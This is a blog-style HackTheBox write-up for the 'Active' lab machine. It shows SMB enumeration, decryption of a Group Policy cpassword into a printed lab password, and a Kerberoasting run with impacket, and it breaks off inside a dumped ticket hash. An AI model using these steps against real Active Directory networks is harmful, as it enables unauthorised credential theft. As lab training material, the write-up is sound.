@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Active | Active is a very good box to practice pentesting on Active Directory. Particularly interesting is the Kerberoasting attack. I strongly suggest...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Active</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-04-30 17:53:00+01:00">Thu 30 April 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Active.html">Active</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Active.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Active is a very good box to practice pentesting on Active Directory. Particularly interesting is the Kerberoasting attack. I strongly suggest to have a read about how Kerberos work in order to understand the attack in question. Few scripts from the impacket framework are used throughout the write-up to accomplish the kerberoasting attack. </p>
+<h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sV -sC <span class="m">10</span>.10.10.100
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-22 11:19 BST</span>
+<span class="go">Nmap scan report for 10.10.10.100</span>
+<span class="go">Host is up (0.100s latency).</span>
+<span class="go">Not shown: 983 closed ports</span>
+<span class="go">PORT      STATE SERVICE       VERSION</span>
+<span class="go">53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)</span>
+<span class="go">| dns-nsid: </span>
+<span class="go">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)</span>
+<span class="go">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-22 10:17:50Z)</span>
+<span class="go">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="go">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="go">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span>
+<span class="go">445/tcp   open  microsoft-ds?</span>
+<span class="go">464/tcp   open  kpasswd5?</span>
+<span class="go">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">636/tcp   open  tcpwrapped</span>
+<span class="go">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span>
+<span class="go">3269/tcp  open  tcpwrapped</span>
+<span class="go">49152/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49153/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49154/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49155/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">49158/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_clock-skew: -1m52s</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   2.02: </span>
+<span class="go">|_    Message signing enabled and required</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2020-05-22T10:18:47</span>
+<span class="go">|_  start_date: 2020-05-22T10:02:42</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 199.57 seconds</span>
+</pre></div>
+
+
+<p><code>nmap</code> reveals that there is a DNS server running on a Windows 2008 R2 SP1 box. The output shows quite few ports are opened. We see DNS + ldap + kerberos ports so looks like we are dealing with Active directory, if it wasn't already clear from the box name. The ldap string shows the domain name is "active.htb" so I will add this to my <code>/etc/hosts</code> file. We can also see the SMB ports (139, 445) are opened amongst the other ones so we will try to do some SMB enumeration.</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> smbmap -H <span class="m">10</span>.10.10.100
+<span class="go">[!] Authentication error on 10.10.10.100</span>
+</pre></div>
+
+
+<p><code>smbmap</code> outputs an authentication error for some reasons so I try <code>smbclient</code> to list (<code>-L</code>) the SMB shares available and I speficy anonymous authentication (<code>-N</code>):  </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> smbclient -L <span class="m">10</span>.10.10.100 -N
+<span class="go">Anonymous login successful</span>
+
+<span class="go">        Sharename       Type      Comment</span>
+<span class="go">        ---------       ----      -------</span>
+<span class="go">        ADMIN$          Disk      Remote Admin</span>
+<span class="go">        C$              Disk      Default share</span>
+<span class="go">        IPC$            IPC       Remote IPC</span>
+<span class="go">        NETLOGON        Disk      Logon server share </span>
+<span class="go">        Replication     Disk      </span>
+<span class="go">        SYSVOL          Disk      Logon server share </span>
+<span class="go">        Users           Disk      </span>
+<span class="go">SMB1 disabled -- no workgroup available</span>
+</pre></div>
+
+
+<p>So we get a list of shares but we don't know exactly which one allows for anonymous authentication. <code>smbmap</code> is very useful on that matter as it would show which share you can access but since I got an error then I guessed the share in question is <code>Replication</code> because it looks a non-defaualt one. </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> smbclient //10.10.10.100/replication -N
+<span class="go">Anonymous login successful</span>
+<span class="go">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="go">smb: \&gt; ls</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  active.htb                          D        0  Sat Jul 21 11:37:44 2018</span>
+
+<span class="go">                10459647 blocks of size 4096. 4925086 blocks available</span>
+<span class="go">smb: \&gt;</span>
+</pre></div>
+
+
+<p>Indeed, as shown above I am able to access the share and see the content. To have a look at content of all subdirectories at once I will launch the following command which includes a recursive listing:</p>
+<div class="highlight"><pre><span></span><span class="gp">sittingDucks:~$</span> smbclient //10.10.10.100/Replication  -N -c <span class="s1">&#39;recurse;ls&#39;</span>
+<span class="go">Anonymous login successful</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  active.htb                          D        0  Sat Jul 21 11:37:44 2018</span>
+
+<span class="go">\active.htb</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  DfsrPrivate                       DHS        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  Policies                            D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  scripts                             D        0  Wed Jul 18 19:48:57 2018</span>
+
+<span class="go">\active.htb\DfsrPrivate</span>
+<span class="go">  .                                 DHS        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                DHS        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ConflictAndDeleted                  D        0  Wed Jul 18 19:51:30 2018</span>
+<span class="go">  Deleted                             D        0  Wed Jul 18 19:51:30 2018</span>
+<span class="go">  Installing                          D        0  Wed Jul 18 19:51:30 2018</span>
+
+<span class="go">\active.htb\Policies</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 11:37:44 2018</span>
+
+<span class="go">\active.htb\scripts</span>
+<span class="go">  .                                   D        0  Wed Jul 18 19:48:57 2018</span>
+<span class="go">  ..                                  D        0  Wed Jul 18 19:48:57 2018</span>
+
+<span class="go">\active.htb\DfsrPrivate\ConflictAndDeleted</span>
+<span class="go">  .                                   D        0  Wed Jul 18 19:51:30 2018</span>
+<span class="go">  ..                                  D        0  Wed Jul 18 19:51:30 2018</span>
+
+<span class="go">\active.htb\DfsrPrivate\Deleted</span>
+<span class="go">  .                                   D        0  Wed Jul 18 19:51:30 2018</span>
+<span class="go">  ..                                  D        0  Wed Jul 18 19:51:30 2018</span>
+
+<span class="go">\active.htb\DfsrPrivate\Installing</span>
+<span class="go">  .                                   D        0  Wed Jul 18 19:51:30 2018</span>
+<span class="go">  ..                                  D        0  Wed Jul 18 19:51:30 2018</span>
+
+<span class="go">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  GPT.INI                             A       23  Wed Jul 18 21:46:06 2018</span>
+<span class="go">  Group Policy                        D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  MACHINE                             D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  USER                                D        0  Wed Jul 18 19:49:12 2018</span>
+
+<span class="go">\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  GPT.INI                             A       22  Wed Jul 18 19:49:12 2018</span>
+<span class="go">  MACHINE                             D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  USER                                D        0  Wed Jul 18 19:49:12 2018</span>
+
+<span class="go">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  GPE.INI                             A      119  Wed Jul 18 21:46:06 2018</span>
+
+<span class="go">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  Microsoft                           D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  Preferences                         D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  Registry.pol                        A     2788  Wed Jul 18 19:53:45 2018</span>
+
+<span class="go">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER</span>
+<span class="go">  .                                   D        0  Wed Jul 18 19:49:12 2018</span>
+<span class="go">  ..                                  D        0  Wed Jul 18 19:49:12 2018</span>
+
+<span class="go">\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  Microsoft                           D        0  Sat Jul 21 11:37:44 2018</span>
+
+<span class="go">\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER</span>
+<span class="go">  .                                   D        0  Wed Jul 18 19:49:12 2018</span>
+<span class="go">  ..                                  D        0  Wed Jul 18 19:49:12 2018</span>
+
+<span class="go">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  Windows NT                          D        0  Sat Jul 21 11:37:44 2018</span>
+
+<span class="go">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  Groups                              D        0  Sat Jul 21 11:37:44 2018</span>
+
+<span class="go">\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  Windows NT                          D        0  Sat Jul 21 11:37:44 2018</span>
+
+<span class="go">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  SecEdit                             D        0  Sat Jul 21 11:37:44 2018</span>
+
+<span class="go">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  Groups.xml                          A      533  Wed Jul 18 21:46:06 2018</span>
+
+<span class="go">\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  SecEdit                             D        0  Sat Jul 21 11:37:44 2018</span>
+
+<span class="go">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  GptTmpl.inf                         A     1098  Wed Jul 18 19:49:12 2018</span>
+
+<span class="go">\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit</span>
+<span class="go">  .                                   D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 11:37:44 2018</span>
+<span class="go">  GptTmpl.inf                         A     3722  Wed Jul 18 19:49:12 2018</span>
+
+<span class="go">                10459647 blocks of size 4096. 4925070 blocks available</span>
+</pre></div>
+
+
+<p><code>Groups.xml</code> is a Group Policy file which may contain local account information which can lead us to accessing the box. </p>
+<div class="highlight"><pre><span></span><span class="go">smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\&gt; get Groups.xml</span>
+<span class="go">getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)</span>
+</pre></div>
+
+
+<p>So I download the file with the above <code>get</code> command and I have a look at it locally:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/active$</span> cat Groups.xml 
+<span class="go">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="go">&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;</span>
+<span class="go">&lt;/Groups&gt;</span>
+</pre></div>
+
+
+<p>We can see a domain\username  <code>active.htb\SVC_TGS</code> and its password <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code>, however the latter is encrypted. To decrypt it we can use a tool dubbed <code>gpp-decrypt</code> available in Kali:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/active$</span> gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+<span class="go">/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated</span>
+<span class="go">GPPstillStandingStrong2k18</span>
+</pre></div>
+
+
+<p>Finally we have the password in clear for the user, that is <code>GPPstillStandingStrong2k18</code>.</p>
+<p>Now that we have the credentials we can try <code>smbmap</code> again to list the shares, hopefully we won't get the authentication error again:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> smbmap -H <span class="m">10</span>.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
+<span class="go">[+] IP: 10.10.10.100:445        Name: active.htb                                        </span>
+<span class="go">        Disk                                                    Permissions     Comment</span>
+<span class="go">        ----                                                    -----------     -------</span>
+<span class="go">        ADMIN$                                                  NO ACCESS       Remote Admin</span>
+<span class="go">        C$                                                      NO ACCESS       Default share</span>
+<span class="go">        IPC$                                                    NO ACCESS       Remote IPC</span>
+<span class="go">        NETLOGON                                                READ ONLY       Logon server share </span>
+<span class="go">        Replication                                             READ ONLY</span>
+<span class="go">        SYSVOL                                                  READ ONLY       Logon server share </span>
+<span class="go">        Users                                                   READ ONLY</span>
+</pre></div>
+
+
+<p>There is a <code>Users</code> share which looks interesting because it may be <code>C:\Users</code>. Let's connect to it an check:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> smbclient //10.10.10.100/Users -U SVC_TGS
+<span class="go">Enter WORKGROUP\SVC_TGS&#39;s password: </span>
+<span class="go">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="go">smb: \&gt; ls</span>
+<span class="go">  .                                  DR        0  Sat Jul 21 15:39:20 2018</span>
+<span class="go">  ..                                 DR        0  Sat Jul 21 15:39:20 2018</span>
+<span class="go">  Administrator                       D        0  Mon Jul 16 11:14:21 2018</span>
+<span class="go">  All Users                         DHS        0  Tue Jul 14 06:06:44 2009</span>
+<span class="go">  Default                           DHR        0  Tue Jul 14 07:38:21 2009</span>
+<span class="go">  Default User                      DHS        0  Tue Jul 14 06:06:44 2009</span>
+<span class="go">  desktop.ini                       AHS      174  Tue Jul 14 05:57:55 2009</span>
+<span class="go">  Public                             DR        0  Tue Jul 14 05:57:55 2009</span>
+<span class="go">  SVC_TGS                             D        0  Sat Jul 21 16:16:32 2018</span>
+
+<span class="go">                10459647 blocks of size 4096. 4892166 blocks available</span>
+<span class="go">smb: \&gt; cd SVC_TGS</span>
+<span class="go">smb: \SVC_TGS\&gt; ls</span>
+<span class="go">  .                                   D        0  Sat Jul 21 16:16:32 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 16:16:32 2018</span>
+<span class="go">  Contacts                            D        0  Sat Jul 21 16:14:11 2018</span>
+<span class="go">  Desktop                             D        0  Sat Jul 21 16:14:42 2018</span>
+<span class="go">  Downloads                           D        0  Sat Jul 21 16:14:23 2018</span>
+<span class="go">  Favorites                           D        0  Sat Jul 21 16:14:44 2018</span>
+<span class="go">  Links                               D        0  Sat Jul 21 16:14:57 2018</span>
+<span class="go">  My Documents                        D        0  Sat Jul 21 16:15:03 2018</span>
+<span class="go">  My Music                            D        0  Sat Jul 21 16:15:32 2018</span>
+<span class="go">  My Pictures                         D        0  Sat Jul 21 16:15:43 2018</span>
+<span class="go">  My Videos                           D        0  Sat Jul 21 16:15:53 2018</span>
+<span class="go">  Saved Games                         D        0  Sat Jul 21 16:16:12 2018</span>
+<span class="go">  Searches                            D        0  Sat Jul 21 16:16:24 2018</span>
+
+<span class="go">                10459647 blocks of size 4096. 4888993 blocks available</span>
+<span class="go">smb: \SVC_TGS\&gt; cd Desktop</span>
+<span class="go">smb: \SVC_TGS\Desktop\&gt; dir</span>
+<span class="go">  .                                   D        0  Sat Jul 21 16:14:42 2018</span>
+<span class="go">  ..                                  D        0  Sat Jul 21 16:14:42 2018</span>
+<span class="go">  user.txt                            A       34  Sat Jul 21 16:06:25 2018</span>
+
+<span class="go">                10459647 blocks of size 4096. 4887268 blocks available</span>
+<span class="go">smb: \SVC_TGS\Desktop\&gt; get user.txt</span>
+<span class="go">getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span>
+<span class="go">smb: \SVC_TGS\Desktop\&gt;</span>
+</pre></div>
+
+
+<p>Indeed, the suspition was correct and the <code>Users</code> shared was <code>C:/Users</code> so I was able to find and download the <code>user.txt</code> flag.</p>
+<div class="highlight"><pre><span></span><span class="err">m4rc0ff@SittingDucks:~/Documents/htbBoxes/active$ cat user.txt </span>
+<span class="err">86****************************83</span>
+</pre></div>
+
+
+<p>If we try the same process for the <code>root.txt</code> flag we will see we don't have permissions to access the Administrator user Desktop:</p>
+<div class="highlight"><pre><span></span><span class="go">smb: \Administrator\&gt; cd Desktop</span>
+<span class="go">cd \Administrator\Desktop\: NT_STATUS_ACCESS_DENIED</span>
+</pre></div>
+
+
+<h1 id="kerberoasting">Kerberoasting</h1>
+<p>Kerberos is an established authentication protocol which has been out for quite a while. It is heavily used on Windows but can be also used in Linux. The idea behind kerberos is that when a client needs to access a particular service, it makes a request to the DC (Domain Controller) requesting a TGT (Ticket Granting Ticket), the DC validates the request and if everything checks out then it releases the TGT. The client then requests a TGS (Ticket Granting Service) and the DC replies back with it. At this point the client can use the TGS to access a particular application in the domain. The Kerberoasting attack consists on stealing the TGS and extract the password (used to access the service) it contains using brute-force. Let's see this in practice:</p>
+<p>We can now use the below <code>impacket-GetUserSPNs</code> script from the <a href="https://github.com/SecureAuthCorp/impacket">impacket framework</a> to get the user SPN (Service Principal Name)</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> impacket-GetUserSPNs -request -dc-ip <span class="m">10</span>.10.10.100 active.htb/SVC_TGS -save -outputfile UserSPNs.out
+<span class="go">/usr/share/doc/python3-impacket/examples/GetUserSPNs.py:438: SyntaxWarning: &quot;is&quot; with a literal. Did you mean &quot;==&quot;?</span>
+<span class="go">  if userDomain is &#39;&#39;:</span>
+<span class="go">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span>
+
+<span class="go">Password:</span>
+<span class="go">ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                  </span>
+<span class="go">--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------</span>
+<span class="go">active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2018-07-30 18:17:40.656520 </span>
+</pre></div>
+
+
+<p>if we look at the output file we can also see we got the TGT:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> cat UserSPNs.out 
+<span class="gp">$</span>krb5tgs<span class="nv">$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>/CIFS~445*<span class="nv">$e7d1aaeab1d15b9f580ac541730fc7a7$42</span>c4e2f8f77a818dfa8b88b8ed54a89c1a84c36d60b01f90f65efb71b709260a856eff3c4f1858c07fa637cf22621648dd996d6e95b0c8a84a9d68483939da6a122f1a98d6f6e8c601719515f3951c383dd4fc311067f5e1003ecbd6eeb9a80a9f22a621a12c128e8763755d000d4dac4e3caa00ed4e0a0e2c8f603b0f3cbe85a7f755a9cc51bef72cceac934fd64d61de350170a7fadb686f361fe8d0b949733d1ebf87a22ecb7fe7c1a8912bbf69b32665f8d55523e8078e1a4b0e314a52bfda7785514bc77a97c6ac2ce6c04efff310cb095d1edc75925608a3dde886474ba05c2902db8e8a767a732edad05f65b5ed5f876fb70a1870ca2797d8938dae38e66a8092d99b403761f68e23a0f989e486a39456cfdc07cc36340f8da30061c6ed3c53e7060f5368ec945fcc3adfbbd83ddd7b28c339bde70c4f80c4f1c3fca28bc38f7a720ea206b3b434991737b25e931c3b6c7bd50adfb7eb5f99f904423383f5f30562bc9e8700a94b31c0830d7516f8f6ed7d2411083a5fb1a3ef074064364a11e0e4a3b3bc7766e3ae74a4a13f01052e19fe8a010acffd0c0c994560ddb23c7b726a3ea74d518dce6d172e30941c793668aa4b257020ec8d589edfe5edad9e156d1fb39d8adef8d9b95f19629c3b27aba285ee5f8c453bab8bf2f8f7b202fd176d059d34960e05e1a6c242bf510505cda9ca25a5f1d2029981beafc561b1bb141bcbfcf8a89cf7444211357a241370835de474a4aac083a1d71b18f830ced2255326e018832577106d6cdd4e4c0fd88cb5729944168937f6b314e32b1a353953c8d8aa8dcec06d8d2a356b28cc17f55f0a